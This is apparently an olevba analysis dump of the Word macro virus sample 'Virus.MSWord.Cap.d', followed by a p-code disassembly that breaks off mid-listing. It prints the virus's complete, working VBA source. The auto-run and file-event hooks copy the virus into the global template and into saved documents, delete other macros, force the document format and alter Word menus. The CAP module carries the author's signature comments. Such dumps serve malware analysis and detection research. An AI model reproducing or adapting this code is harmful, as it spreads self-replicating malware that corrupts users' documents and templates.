olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cap.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cap.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: ./Virus.MSWord.Cap.d - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub  + + +
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Cap.d - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%SA"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
On Error Resume Next
WordBasic.Call "CAP.FSA"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: ./Virus.MSWord.Cap.d - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%C"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
On Error Resume Next
WordBasic.Call "CAP.FC"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Cap.d - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
On Error Resume Next
WordBasic.Call "CAP.S", WordBasic.[FileName$]()
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: ./Virus.MSWord.Cap.d - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%S"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
On Error Resume Next
WordBasic.Call "CAP.FS"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: ./Virus.MSWord.Cap.d - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%O"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
On Error Resume Next
WordBasic.Call "CAP.FO"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Cap.d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
On Error Resume Next
WordBasic.Call "CAP.S", WordBasic.[FileName$]()
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: ./Virus.MSWord.Cap.d - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
On Error Resume Next
WordBasic.DisableAutoMacros 0
WordBasic.Call "CAP.S", ""
End Sub
-------------------------------------------------------------------------------
VBA MACRO CAP.bas 
in file: ./Virus.MSWord.Cap.d - OLE stream: 'Macros/VBA/CAP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim M__$()
Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.CAP.MAIN"
ReDim M__$(9)
'C.A.P: Un virus social.. y ahora digital..
'"j4cKy Qw3rTy" (jqw3rty@hotmail.com).
'Venezuela, Maracay, Dic 1996.
'P.D. Que haces gochito ? Nunca seras Simon Bolivar.. Bolsa !
End Sub
Private Sub S(F$)
Dim S_$
Dim D$
Dim C$
Dim B$
Dim A$
Dim M_
Dim N
Dim T
Dim I
Dim J
Dim K
Dim D_ As Object
On Error Resume Next
S_$ = "F%"
D$ = "Macro"
C$ = "Close"
B$ = "Open"
A$ = "File"
M__$(0) = "CAP"
M__$(3) = A$ + C$
M__$(5) = A$ + "Save"
M__$(2) = A$ + B$
M__$(9) = A$ + "Templates"
A$ = "Auto"
M__$(6) = M__$(5) + "As"
M__$(1) = A$ + B$
M__$(8) = A$ + "Exec"
M__$(4) = A$ + C$
M__$(7) = "Tools" + D$
M_ = 0
N = 0
For T = 1 To 0 Step -1
For I = WordBasic.CountMacros(T) To 1 Step -1
B$ = WordBasic.[MacroName$](I, T)
If S_$ = WordBasic.[Left$](WordBasic.[MacroDesc$](B$), 2) Then
For J = 0 To 9
If B$ = M__$(J) Then
If T Then N = N + 1 Else M_ = M_ + 1
J = 9
End If
Next
Else
WordBasic.ToolsMacro Name:=B$, Show:=T + T + 1, Delete:=1
End If
Next
Next
If F$ <> "" Then
If M_ < 10 And N Then
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, FastSaves:=1, AutoSave:=1, SaveInterval:="10"
For I = 0 To 9
If I <> 7 Then K = -1 Else K = 0
WordBasic.MacroCopy F$ + ":" + M__$(I), M__$(I), K
Next
B$ = S_$ + WordBasic.[LTrim$](Str(WordBasic.Val(Mid(WordBasic.[MacroDesc$](M__$(7)), 3)) + 1))
WordBasic.ToolsMacro Name:=M__$(7), Show:=1, Description:=B$, SetDesc:=1
A$ = WordBasic.[MenuText$](0, 1)
For I = WordBasic.CountMacros(1) To 1 Step -1
J = 0
B$ = WordBasic.[MacroName$](I, 1)
Select Case WordBasic.[MacroDesc$](B$)
Case S_$ + "O"
J = 2
Case S_$ + "C"
J = 3
Case S_$ + "S"
J = 5
Case S_$ + "SA"
J = 6
End Select
If J Then
C$ = WordBasic.[MenuItemMacro$](A$, 0, J)
If WordBasic.[Left$](UCase(C$), Len(M__$(J))) <> UCase(M__$(J)) And WordBasic.[Left$](C$, 1) <> "(" Then WordBasic.MacroCopy F$ + ":" + B$, C$, K
End If
Next
T = -1
For I = 0 To 1
If I Then J = 1 Else J = 6
A$ = WordBasic.[MenuText$](I, J)
J = WordBasic.CountMenuItems(A$, I) - 1
For M_ = J To 1 Step -1
If InStr(WordBasic.[MenuItemMacro$](A$, I, M_), D$) Then
If I Then
B$ = WordBasic.[MenuItemMacro$](A$, I, M_ - 2)
If UCase(B$) <> UCase(M__$(9)) And WordBasic.[Left$](B$, 1) <> "(" Then WordBasic.MacroCopy M__$(9), B$, K
Else
M_ = M_ + 1
End If
For T = M_ To M_ - 1 Step -1
If T > 3 Then WordBasic.ToolsCustomizeMenus MenuType:=I, Position:=T, Name:=WordBasic.[MenuItemMacro$](A$, I, T), Menu:=A$, Remove:=1, Context:=0
Next
M_ = 1
T = 0
End If
Next
Next
If T Then
For I = 6 To J
If WordBasic.[Left$](WordBasic.[MenuItemMacro$](A$, 1, I), 1) = "(" And WordBasic.[Left$](WordBasic.[MenuItemMacro$](A$, 1, I - 2), 1) = "(" Then
For T = 1 To 3 Step 2
B$ = WordBasic.[MenuItemMacro$](A$, 1, I - T)
If WordBasic.[Left$](B$, 1) <> "(" Then WordBasic.MacroCopy M__$(T + 6), B$, K
Next
I = J
End If
Next
End If
End If
Set D_ = WordBasic.DialogRecord.FileSaveAs(False)
Set D_ = WordBasic.CurValues.FileSaveAs
If N < 10 And D_.Format = 1 Or D_.Format = 0 Or D_.Format = 6 Then
D_.Format = 1
For I = WordBasic.CountMacros(0) To 1 Step -1
B$ = WordBasic.[MacroName$](I, 0)
If B$ <> M__$(7) Then K = -1 Else K = 0
WordBasic.MacroCopy B$, F$ + ":" + B$, K
Next
WordBasic.FileSaveAs D_
End If
End If
Err.Number = 0
End Sub
Private Sub FO()
On Error Resume Next
WordBasic.DisableAutoMacros
On Error GoTo -1: On Error GoTo E
Dim D As Object: Set D = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen D
WordBasic.Dialog.FileOpen D
WordBasic.FileOpen D
S (D.Name)
E:
End Sub
Private Sub FC()
On Error Resume Next
WordBasic.DisableAutoMacros
S WordBasic.[FileName$]()
WordBasic.FileClose
End Sub
Private Sub FS()
On Error Resume Next
WordBasic.DisableAutoMacros
On Error GoTo -1: On Error GoTo F
WordBasic.FileSave
S WordBasic.[FileName$]()
F:
End Sub
Private Sub FSA()
Dim T
Dim W$
On Error Resume Next
WordBasic.DisableAutoMacros
On Error GoTo -1: On Error GoTo G
Dim D As Object: Set D = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs D
If D.Format <> 1 Then
WordBasic.Dialog.FileSaveAs D
WordBasic.FileSaveAs D
S (D.Name)
Else
T = WordBasic.Window()
W$ = D.Name
WordBasic.FileNew Template:=WordBasic.[FileName$]()
On Error GoTo -1: On Error GoTo H
WordBasic.CurValues.FileSaveAs D
D.Name = W$
WordBasic.Dialog.FileSaveAs D
WordBasic.FileSaveAs D
On Error GoTo -1: On Error GoTo G
S (D.Name)
If T >= WordBasic.Window() Then T = T + 1
WordBasic.WindowList T
H:
WordBasic.FileClose 2
End If
G:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cap.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/ToolsMacro - 761 bytes
' Line #0:
' Line #1:
' 	Reparse 0x0016 "Private Sub  + + +"
' Macros/VBA/FileSaveAs - 1188 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x0007 "CAP.FSA"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #4:
' 	EndSub 
' Macros/VBA/FileClose - 1186 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x0006 "CAP.FC"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #4:
' 	EndSub 
' Macros/VBA/AutoClose - 1217 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x0005 "CAP.S"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0002 
' Line #4:
' 	EndSub 
' Macros/VBA/FileSave - 1185 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x0006 "CAP.FS"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #4:
' 	EndSub 
' Macros/VBA/FileOpen - 1185 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x0006 "CAP.FO"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #4:
' 	EndSub 
' Macros/VBA/AutoOpen - 1208 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x0005 "CAP.S"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0002 
' Line #4:
' 	EndSub 
' Macros/VBA/AutoExec - 1238 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #4:
' 	LitStr 0x0005 "CAP.S"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0002 
' Line #5:
' 	EndSub 
' Macros/VBA/CAP - 10116 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	VarDefn M__
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' 	OptionBase 
' 	LitDI2 0x0009 
' 	Redim M__$ 0x0001 (As String)
' Line #4:
' 	QuoteRem 0x0000 0x002A "C.A.P: Un virus social.. y ahora digital.."
' Line #5:
' 	QuoteRem 0x0000 0x0025 ""j4cKy Qw3rTy" (jqw3rty@hotmail.com)."
' Line #6:
' 	QuoteRem 0x0000 0x001D "Venezuela, Maracay, Dic 1996."
' Line #7:
' 	QuoteRem 0x0000 0x003C "P.D. Que haces gochito ? Nunca seras Simon Bolivar.. Bolsa !"
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Private Sub S(False))
' Line #10:
' 	Dim 
' 	VarDefn S_
' Line #11:
' 	Dim 
' 	VarDefn D
' Line #12:
' 	Dim 
' 	VarDefn C
' Line #13:
' 	Dim 
' 	VarDefn B
' Line #14:
' 	Dim 
' 	VarDefn A
' Line #15:
' 	Dim 
' 	VarDefn M_
' Line #16:
' 	Dim 
' 	VarDefn N
' Line #17:
' 	Dim 
' 	VarDefn T
' Line #18:
' 	Dim 
' 	VarDefn I
' Line #19:
' 	Dim 
' 	VarDefn J
' Line #20:
' 	Dim 
' 	VarDefn K
' Line #21:
' 	Dim 
' 	VarDefn D_ (As Object)
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	LitStr 0x0002 "F%"
' 	St S_$ 
' Line #24:
' 	LitStr 0x0005 "Macro"
' 	St D$ 
' Line #25:
' 	LitStr 0x0005 "Close"
' 	St C$ 
' Line #26:
' 	LitStr 0x0004 "Open"
' 	St B$ 
' Line #27:
' 	LitStr 0x0004 "File"
' 	St A$ 
' Line #28:
' 	LitStr 0x0003 "CAP"
' 	LitDI2 0x0000 
' 	ArgsSt M__$ 0x0001 
' Line #29:
' 	Ld A$ 
' 	Ld C$ 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsSt M__$ 0x0001 
' Line #30:
' 	Ld A$ 
' 	LitStr 0x0004 "Save"
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsSt M__$ 0x0001 
' Line #31:
' 	Ld A$ 
' 	Ld B$ 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsSt M__$ 0x0001 
' Line #32:
' 	Ld A$ 
' 	LitStr 0x0009 "Templates"
' 	Add 
' 	LitDI2 0x0009 
' 	ArgsSt M__$ 0x0001 
' Line #33:
' 	LitStr 0x0004 "Auto"
' 	St A$ 
' Line #34:
' 	LitDI2 0x0005 
' 	ArgsLd M__$ 0x0001 
' 	LitStr 0x0002 "As"
' 	Add 
' 	LitDI2 0x0006 
' 	ArgsSt M__$ 0x0001 
' Line #35:
' 	Ld A$ 
' 	Ld B$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsSt M__$ 0x0001 
' Line #36:
' 	Ld A$ 
' 	LitStr 0x0004 "Exec"
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsSt M__$ 0x0001 
' Line #37:
' 	Ld A$ 
' 	Ld C$ 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsSt M__$ 0x0001 
' Line #38:
' 	LitStr 0x0005 "Tools"
' 	Ld D$ 
' 	Add 
' 	LitDI2 0x0007 
' 	ArgsSt M__$ 0x0001 
' Line #39:
' 	LitDI2 0x0000 
' 	St M_ 
' Line #40:
' 	LitDI2 0x0000 
' 	St N 
' Line #41:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #42:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	Ld T 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #43:
' 	Ld I 
' 	Ld T 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St B$ 
' Line #44:
' 	Ld S_$ 
' 	Ld B$ 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroDesc$] 0x0001 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0009 
' 	For 
' Line #46:
' 	Ld B$ 
' 	Ld J 
' 	ArgsLd M__$ 0x0001 
' 	Eq 
' 	IfBlock 
' Line #47:
' 	Ld T 
' 	If 
' 	BoSImplicit 
' 	Ld N 
' 	LitDI2 0x0001 
' 	Add 
' 	St N 
' 	Else 
' 	BoSImplicit 
' 	Ld M_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St M_ 
' 	EndIf 
' Line #48:
' 	LitDI2 0x0009 
' 	St J 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	StartForVariable 
' 	Next 
' Line #51:
' 	ElseBlock 
' Line #52:
' 	Ld B$ 
' 	ParamNamed New 
' 	Ld T 
' 	Ld T 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	StartForVariable 
' 	Next 
' Line #55:
' 	StartForVariable 
' 	Next 
' Line #56:
' 	Ld False$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #57:
' 	Ld M_ 
' 	LitDI2 0x000A 
' 	Lt 
' 	Ld N 
' 	And 
' 	IfBlock 
' Line #58:
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	LitDI2 0x0001 
' 	ParamNamed FastSaves 
' 	LitDI2 0x0001 
' 	ParamNamed AutoSave 
' 	LitStr 0x0002 "10"
' 	ParamNamed SaveInterval 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0004 
' Line #59:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0009 
' 	For 
' Line #60:
' 	Ld I 
' 	LitDI2 0x0007 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St K 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St K 
' 	EndIf 
' Line #61:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld I 
' 	ArgsLd M__$ 0x0001 
' 	Add 
' 	Ld I 
' 	ArgsLd M__$ 0x0001 
' 	Ld K 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #62:
' 	StartForVariable 
' 	Next 
' Line #63:
' 	Ld S_$ 
' 	LitDI2 0x0007 
' 	ArgsLd M__$ 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroDesc$] 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Add 
' 	St B$ 
' Line #64:
' 	LitDI2 0x0007 
' 	ArgsLd M__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Show 
' 	Ld B$ 
' 	ParamNamed Description 
' 	LitDI2 0x0001 
' 	ParamNamed SetDesc 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0004 
' Line #65:
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuText$] 0x0002 
' 	St A$ 
' Line #66:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #67:
' 	LitDI2 0x0000 
' 	St J 
' Line #68:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St B$ 
' Line #69:
' 	Ld B$ 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroDesc$] 0x0001 
' 	SelectCase 
' Line #70:
' 	Ld S_$ 
' 	LitStr 0x0001 "O"
' 	Add 
' 	Case 
' 	CaseDone 
' Line #71:
' 	LitDI2 0x0002 
' 	St J 
' Line #72:
' 	Ld S_$ 
' 	LitStr 0x0001 "C"
' 	Add 
' 	Case 
' 	CaseDone 
' Line #73:
' 	LitDI2 0x0003 
' 	St J 
' Line #74:
' 	Ld S_$ 
' 	LitStr 0x0001 "S"
' 	Add 
' 	Case 
' 	CaseDone 
' Line #75:
' 	LitDI2 0x0005 
' 	St J 
' Line #76:
' 	Ld S_$ 
' 	LitStr 0x0002 "SA"
' 	Add 
' 	Case 
' 	CaseDone 
' Line #77:
' 	LitDI2 0x0006 
' 	St J 
' Line #78:
' 	EndSelect 
' Line #79:
' 	Ld J 
' 	IfBlock 
' Line #80:
' 	Ld A$ 
' 	LitDI2 0x0000 
' 	Ld J 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	St C$ 
' Line #81:
' 	Ld C$ 
' 	ArgsLd UCase 0x0001 
' 	Ld J 
' 	ArgsLd M__$ 0x0001 
' 	FnLen 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	Ld J 
' 	ArgsLd M__$ 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	Ld C$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	LitStr 0x0001 "("
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld B$ 
' 	Add 
' 	Ld C$ 
' 	Ld K 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' 	EndIf 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	StartForVariable 
' 	Next 
' Line #84:
' 	LitDI2 0x0001 
' 	UMi 
' 	St T 
' Line #85:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	For 
' Line #86:
' 	Ld I 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St J 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St J 
' 	EndIf 
' Line #87:
' 	Ld I 
' 	Ld J 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuText$] 0x0002 
' 	St A$ 
' Line #88:
' 	Ld A$ 
' 	Ld I 
' 	Ld WordBasic 
' 	ArgsMemLd CountMenuItems 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	St J 
' Line #89:
' 	StartForVariable 
' 	Ld M_ 
' 	EndForVariable 
' 	Ld J 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #90:
' 	Ld A$ 
' 	Ld I 
' 	Ld M_ 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	Ld D$ 
' 	FnInStr 
' 	IfBlock 
' Line #91:
' 	Ld I 
' 	IfBlock 
' Line #92:
' 	Ld A$ 
' 	Ld I 
' 	Ld M_ 
' 	LitDI2 0x0002 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	St B$ 
' Line #93:
' 	Ld B$ 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd M__$ 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	Ld B$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	LitStr 0x0001 "("
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0009 
' 	ArgsLd M__$ 0x0001 
' 	Ld B$ 
' 	Ld K 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' 	EndIf 
' Line #94:
' 	ElseBlock 
' Line #95:
' 	Ld M_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St M_ 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	Ld M_ 
' 	Ld M_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #98:
' 	Ld T 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld I 
' 	ParamNamed MenuType 
' 	Ld T 
' 	ParamNamed Position 
' 	Ld A$ 
' 	Ld I 
' 	Ld T 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	ParamNamed New 
' 	Ld A$ 
' 	ParamNamed Menu 
' 	LitDI2 0x0001 
' 	ParamNamed Remove 
' 	LitDI2 0x0000 
' 	ParamNamed Context 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsCustomizeMenus 0x0006 
' 	EndIf 
' Line #99:
' 	StartForVariable 
' 	Next 
' Line #100:
' 	LitDI2 0x0001 
' 	St M_ 
' Line #101:
' 	LitDI2 0x0000 
' 	St T 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	StartForVariable 
' 	Next 
' Line #104:
' 	StartForVariable 
' 	Next 
' Line #105:
' 	Ld T 
' 	IfBlock 
' Line #106:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0006 
' 	Ld J 
' 	For 
' Line #107:
' 	Ld A$ 
' 	LitDI2 0x0001 
' 	Ld I 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	LitStr 0x0001 "("
' 	Eq 
' 	Ld A$ 
' 	LitDI2 0x0001 
' 	Ld I 
' 	LitDI2 0x0002 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	LitStr 0x0001 "("
' 	Eq 
' 	And 
' 	IfBlock 
' Line #108:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #109:
' 	Ld A$ 
' 	LitDI2 0x0001 
' 	Ld I 
' 	Ld T 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	St B$ 
' Line #110:
' 	Ld B$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	LitStr 0x0001 "("
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld T 
' 	LitDI2 0x0006 
' 	Add 
' 	ArgsLd M__$ 0x0001 
' 	Ld B$ 
' 	Ld K 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' 	EndIf 
' Line #111:
' 	StartForVariable 
' 	Next 
' Line #112:
' 	Ld J 
' 	St I 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	StartForVariable 
' 	Next 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set D_ 
' Line #118:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd FileSaveAs 
' 	Set D_ 
' Line #119:
' 	Ld N 
' 	LitDI2 0x000A 
' 	Lt 
' 	Ld D_ 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld D_ 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Or 
' 	Ld D_ 
' 	MemLd Format$ 
' 	LitDI2 0x0006 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #120:
' 	LitDI2 0x0001 
' 	Ld D_ 
' 	MemSt Format$ 
' Line #121:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #122:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
